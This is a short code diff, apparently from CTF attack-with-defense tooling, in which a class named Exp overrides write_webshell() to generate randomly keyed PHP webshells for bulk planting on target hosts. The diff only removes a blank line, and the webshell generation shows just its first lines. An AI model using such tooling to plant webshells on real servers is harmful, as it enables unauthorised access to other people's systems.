@@ -9,7 +9,6 @@ class Exp(AwdTask):
     """
     自定义一个Exp类，继承自AwdTask。覆写的 write_webshell()，批量写webshell
     """
-
     def write_webshell(self,host,port):
         webshell = PHP(key=PHP.get_random_string(8))
         php = webshell.generate(passwd=PHP.get_random_string(8))
